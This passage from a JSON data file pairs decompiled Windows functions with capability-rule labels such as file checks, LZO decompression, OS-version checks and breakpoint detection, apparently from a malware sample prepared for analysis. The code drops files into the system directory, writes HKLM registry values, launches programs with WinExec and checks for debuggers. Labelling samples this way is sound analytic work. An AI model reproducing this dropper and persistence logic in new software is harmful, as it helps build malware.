pcVar5 & 0xffffff00 | uVar4;\n                *extraout_ECX = *extraout_ECX ^ uVar4;\n                *pcVar8 = *pcVar8 + uVar4;\n                uStack29 = unaff_EBX;\n                uStack28 = unaff_EBX >> 8;\n                uStack27 = unaff_EBX >> 0x10;\n                uStack36 = puVar2 >> 8;\n                uStack35 = puVar2 >> 0x10;\n                unaff_EBP[-1] = 0xffffffff;\n                iVar9 = (**0x422628)(2, 0, puVar2);\n                unaff_EBP[-2] = iVar9;\n                if (iVar9 == -1) {\n                    return 0xffffffff;\n                }\n                unaff_EBP[-0x4c] = 0x128;\n                puVar12 = unaff_EBP + -0x4b;\n                for (iVar10 = 0x49; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                iVar10 = (**0x42262c)(iVar9, unaff_EBP + -0x4c);\n                pcVar5 = _sym.imp.MSVCRT.dll__stricmp;\n                if (iVar10 != 0) {\n                    uVar7 = unaff_EBP[2];\n                    do {\n    // WARNING: Bad instruction - Truncating control flow here\n                        iVar10 = (*pcVar5)(unaff_EBP + -0xc, uVar7);\n                        if (iVar10 == 0) {\n                            uVar7 = unaff_EBP[-0x4a];\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(unaff_EBP[-2]);\n                            return uVar7;\n                        }\n                        iVar10 = (**0x422630)(iVar9, unaff_EBP + -0x30);\n                    } while (iVar10 != 0);\n                }\n                uVar7 = unaff_EBP[-1];\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar9);\n                return uVar7;\n            }\n            uVar6 = pcVar5 ^ 0xdee0ed6d;\n            uVar4 = uVar6 + (uVar6 >> 8) * -0x31;\n            puVar1 = (uVar6 & 0xffff0000 | uVar4) - 0x58;\n            *puVar1 = *puVar1 ^ extraout_ECX >> 8;\n            uVar13 = (POPCOUNT(uVar4 + *extraout_ECX) & 1U) == 0;\n            puVar12 = puVar2;\n            goto code_r0x0040441f;\n        }\n    }\n    uStack28 = 0xa8;\n    uStack27 = 0x4112;\n    uStack25 = 0;\ncode_r0x0040441f:\n    uStack33._1_3_ = uStack33;\n    uStack29 = uStack33 >> 0x18;\n    uStack36 = 0x22;\n    uStack35 = 0x4044;\n    uStack33._0_1_ = 0;\n    *0x42262c = (*puVar12)();\n    if ((!uVar13) && (uVar13)) {\n        puVar12 = &uStack36;\n        cVar3 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *unaff_EBP;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        uVar7 = in(0x78);\n        return uVar7;\n    }\n    uStack36 = 0xb8;\n    uStack35 = 0x4112;\n    uStack33 = uStack33._1_3_ << 8;\n    *0x422630 = (*puVar12)();\n    if (((*0x422628 != NULL) && (*0x42262c != NULL)) && (*0x422630 != NULL)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1567
    },
    "00404630": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404630(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint8_t in_AF;\n    bool bVar2;\n    float10 extraout_ST0;\n    ulong uVar3;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0;\n    uStack24 = 0x80;\n    uStack28 = 2;\n    uStack32 = 0;\n    uStack36 = 1;\n    uStack40 = 0x40000000;\n    uStack44 = arg_8h;\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    bVar2 = -1 < arg_8h_00 + 1;\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    if ((bVar2) && (!bVar2)) {\n        *(arg_8h_00 + 0x1c) = extraout_ST0;\n        arg_8h_00 = arg_8h_00 + 5;\n    }\n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*0x422618 != 0) {\n            iVar1 = fcn.00404580(arg_8h_00);\n            *0x422618 = iVar1 == 0;\n        }\n        uVar3 = fcn.00401730(0, arg_8h_00);\n        arg_10h = uVar3 >> 0x20;\n        if ((*0x10 == 0x2c || SCARRY4(&stack0xffffffcc, 8) != &uStack44 < 0) ||\n           (*0x10 != 0x2c && SCARRY4(&stack0xffffffcc, 8) == &uStack44 < 0)) break;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        arg_ch = uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    if (*0x422618 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 641
    },
    "00404a50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404baa) overlaps instruction at (ram,0x00404ba9)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404b7b)\n// WARNING: Removing unreachable block (ram,0x00404aa9)\n// WARNING: Removing unreachable block (ram,0x00404ab3)\n// WARNING: Removing unreachable block (ram,0x00404ab7)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00404a50(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    char cVar6;\n    uint uStack535;\n    uchar uStack276;\n    uchar auStack275 [259];\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puVar3 = &uStack535;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uStack276 = 0;\n    puVar3 = auStack275;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    iStack16 = 1;\n    piVar1 = puVar3 + 3;\n    *(puVar3 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276);\n    fcn.00402e90(&uStack8, &uStack12);\n    iVar2 = fcn.00403310(param_1, param_2, param_3, param_4, uStack8, uStack12);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    cVar6 = SCARRY4(iVar2, 1);\n    cVar5 = iVar2 + 1 < 0;\n    *0x422618 = fcn.00403270();\n    piVar4 = piVar1;\n    if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n        out(0xc4, *0x422618);\n        piVar4 = puVar3 + 7;\n        *piVar1 = *0x422618;\n    }\n    iVar2 = fcn.00404630(&uStack276, uStack8, uStack12);\n    if (iVar2 != 0) {\n        piVar1 = param_1 + 1;\n        *piVar4 = *param_1;\n        fcn.00403770();\n        iVar2 = fcn.00404480();\n        if ((iVar2 != -1) || (iVar2 = fcn.00404480(),  iVar2 != -1)) {\n            iVar2 = fcn.00401bd0(piVar1);\n            if (iVar2 != 0) {\n                fcn.00401280();\n                fcn.00405090();\n                return 1;\n            }\n            if (*0x422618 == 0) {\n                return 0;\n            }\n        }\n        iVar2 = fcn.00403190(piVar1, &uStack276);\n        if (iVar2 == 0) {\n            iStack16 = 0;\n        }\n        if ((iStack16 != 0) && (iVar2 = fcn.00405020(piVar1),  iVar2 == 0)) {\n            iStack16 = 0;\n        }\n        iVar2 = iStack16;\n        if (iStack16 == 0) {\n            iVar2 = fcn.00403000(param_1, 0);\n        }\n        if (iVar2 != 0) {\n            fcn.00405090();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x4111f4);\n        return iVar2;\n    }\n    return 0;\n}\n",
        "token_count": 1017
    },
    "004012b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004012b0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42261c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401990(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41145c, acStack1304, &uStack2112);\n    uStack2088 = 0x4114e4;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4114fc;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404310(auStack1564, 0x411458, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "004014c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.004014c0(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "00403000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403000(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x411204, arg_8h);\n    (*pcVar2)(&var_268h, 0x41121c, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_38h = 0x411244;\n    var_34h = 0x411250;\n    var_30h = 0x41125c;\n    var_2ch = 0x41126c;\n    var_28h = 0x411274;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1103
    },
    "00403950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039bf) overlaps instruction at (ram,0x004039bb)\n// \n// WARNING: Removing unreachable block (ram,0x00403988)\n// WARNING: Removing unreachable block (ram,0x00403997)\n\nbool fcn.00403950(uint8_t *param_1)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char **unaff_ESI;\n    char **unaff_EDI;\n    char **ppcVar4;\n    uint16_t in_DS;\n    bool bVar5;\n    ulong uVar6;\n    uint8_t *puStack40;\n    char *pcStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack40 = param_1;\n    uVar6 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    pcVar2 = uVar6;\n    bVar5 = &stack0xffffffdc < 0;\n    ppcVar4 = unaff_EDI;\n    if ((SCARRY4(&puStack40, 4) == bVar5) &&\n       (uVar1 = (uVar6 >> 0x20) << 0x10,  puStack40 = puStack40 & 0xffff | uVar1,  SCARRY4(&puStack40, 4) != bVar5)) {\n        out(0xc4, pcVar2);\n        puStack40 = uVar1 | in_DS;\n        ppcVar4 = unaff_EDI + 1;\n        *unaff_EDI = pcVar2;\n        bVar5 = (param_1 >> 8) - *pcVar2 < '\\0';\n    }\n    pcStack24 = 0x4115b8;\n    uStack20 = 0x4115b0;\n    uStack16 = 0x4115c0;\n    uStack12 = 0x4115c8;\n    uStack8 = 0x4115d0;\n    if ((!bVar5) && (bVar5)) goto code_r0x004039b0;\n    ppcVar4 = NULL;\n    unaff_ESI = &pcStack24;\n    while( true ) {\n        pcVar2 = *unaff_ESI;\ncode_r0x004039b0:\n        *param_1 = *param_1 & 0xc3;\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(param_1, unaff_ESI);\n        if (iVar3 != 0) break;\n        ppcVar4 = ppcVar4 + 1;\n        unaff_ESI = pcVar2 + -0x1bf31dd2;\n        if (0x4 < ppcVar4) {\n            iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(param_1, 0x4115a8);\n            return iVar3 == 0;\n        }\n    }\n    return true;\n}\n",
        "token_count": 668
    },
    "00404860": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404860(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004050a0(0x80000002, 0x411350, 0x41139c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00403850": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038d3) overlaps instruction at (ram,0x004038d2)\n// \n// WARNING: Removing unreachable block (ram,0x00403880)\n// WARNING: Removing unreachable block (ram,0x00403886)\n// WARNING: Removing unreachable block (ram,0x004038d3)\n// WARNING: Removing unreachable block (ram,0x00403889)\n\nbool fcn.00403850(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4115d8, 0x411600, &var_8h, &var_10ch, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&var_10ch, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&var_10ch);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 427
    },
    "00401560": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040164f) overlaps instruction at (ram,0x0040164e)\n// \n// WARNING: Removing unreachable block (ram,0x004015e1)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401560(uint32_t hWnd, uint16_t *Msg, uint32_t wParam, uint lParam)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    uint in_EAX;\n    uint16_t *puVar5;\n    uint32_t in_EDX;\n    int32_t *unaff_EBX;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    uchar *puVar7;\n    bool bVar8;\n    bool in_ZF;\n    bool bVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint16_t uStack16;\n    char *pcVar4;\n    \n    if ((in_ZF) || (!in_ZF)) {\n        in_EDX = hWnd;\n    }\n    *(unaff_ESI + 0x57) = *(unaff_ESI + 0x57) | in_EAX >> 8;\n    puVar7 = uStack16 << 0x10 | 0x47;\n    bVar8 = false;\n    bVar10 = false;\n    bVar9 = wParam == 0;\n    puVar5 = Msg;\n    uVar6 = wParam;\n    do {\n        if (bVar9) {\n            return CONCAT44(in_EDX, (in_EDX >> 0x10) + in_EDX);\n        }\n        if ((bVar10) || (!bVar10)) {\n            in_EDX = in_EDX + *puVar5;\n        }\n        else {\n            uVar2 = in(in_EDX);\n            *puVar7 = uVar2;\n            unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n            puVar7 = puVar7 + 1;\n            if (!bVar8 && !bVar9) {\n                fcn.00401f00();\n                bVar8 = false;\n                fcn.00401a20();\n                if ((bVar8) || (!bVar8)) {\n                    fcn.00404080();\n                }\n                else {\n                    *unaff_EBX = *unaff_EBX & 0xc3;\n                    uVar3 = uVar6 - 0x2a;\n                    pcVar4 = uVar6 & 0xffffff00 | uVar3;\n                    *pcVar4 = *pcVar4 + uVar3;\n                }\n                if (*0x422618 == 0) {\n                    (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n                    fcn.004012b0();\n                }\n                uVar11 = (*_sym.imp.USER32.dll_DefWindowProcA)(hWnd, Msg, wParam, lParam);\n                return uVar11;\n            }\n        }\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*puVar5, unaff_EBX);\n        *unaff_EBX = *unaff_EBX + -0x74993fcd;\n        puVar1 = unaff_EBX + 0x10e8c1c2;\n        *puVar1 = *puVar1 >> 1 | *puVar1 << 7;\n        in_EDX = (in_EDX & 0xffff) + 0xc033;\n        bVar8 = 0xfffffffd < puVar5;\n        puVar5 = puVar5 + 1;\n        bVar10 = SBORROW4(uVar6, 1);\n        uVar6 = uVar6 - 1;\n        bVar9 = uVar6 == 0;\n    } while( true );\n}\n",
        "token_count": 842
    },
    "00401d50": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401db6) overlaps instruction at (ram,0x00401db2)\n// \n// WARNING: Removing unreachable block (ram,0x00401da1)\n// WARNING: Removing unreachable block (ram,0x00401db6)\n// WARNING: Removing unreachable block (ram,0x00401dbf)\n// WARNING: Removing unreachable block (ram,0x00401dc3)\n// WARNING: Removing unreachable block (ram,0x00401e00)\n\nuint64_t __cdecl fcn.00401d50(uint arg_8h, int32_t arg_ch, uint32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t **unaff_EDI;\n    bool bVar6;\n    bool in_OF;\n    uint64_t uVar7;\n    uint32_t uVar3;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = arg_10h;\n        return CONCAT44(arg_8h, arg_10h);\n    }\n    uVar1 = fcn.00401560(0, arg_8h, arg_ch + 1U >> 1 & 0xffff | (arg_ch + 1U >> 0x11) << 0x10, unaff_EDI);\n    uVar1 = uVar1 & 0xffff;\n    uVar7 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar4 = uVar7 >> 0x20;\n    uVar3 = *(uVar7 + 0x58);\n    if (uVar1 < uVar3) {\n        uVar1 = (uVar1 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        uVar4 = uVar3 & 0xffff;\n        uVar1 = uVar1 - uVar4;\n    }\n    if ((uVar1 != 0) && (uVar1 == 0)) {\n        uVar3 = uVar3 & 0xffffff00;\n        uVar1 = 1;\n        out(pe_dos_header, uVar4);\n    }\n    uVar2 = uVar3 >> 0x10;\n    bVar6 = uVar1 < uVar3 >> 0x10;\n    if (bVar6) {\n        iVar5 = (uVar1 - uVar2 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = uVar1 - uVar2;\n    }\n    if ((bVar6 || uVar2 <= uVar1) && (!bVar6 && uVar2 > uVar1)) {\n        out(0xbd, uVar2);\n        return CONCAT44(uVar4, uVar2);\n    }\n    *arg_14h = iVar5 + arg_ch;\n    uVar1 = *(uVar7 + 0x58);\n    *arg_10h = uVar1;\n    return uVar7 & 0xffffffff | uVar1 << 0x20;\n}\n",
        "token_count": 700
    },
    "00401c00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401c00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004019d0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401e90();\n        arg_ch_01 = fcn.00401e90();\n        arg_ch_02 = fcn.00401e90();\n        fcn.00401990(arg_10h, arg_ch_00);\n        fcn.00401990(arg_8h, arg_ch_01);\n        fcn.00401990(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41119c, &lpBuffer, arg_10h);\n        iVar2 = fcn.004011a0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4111a8, &lpBuffer, arg_8h);\n            iVar2 = fcn.004011a0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4111a8, &lpBuffer, arg_ch);\n                iVar2 = fcn.004011a0(&var_210h);\n                if (iVar2 != 0) {\n                    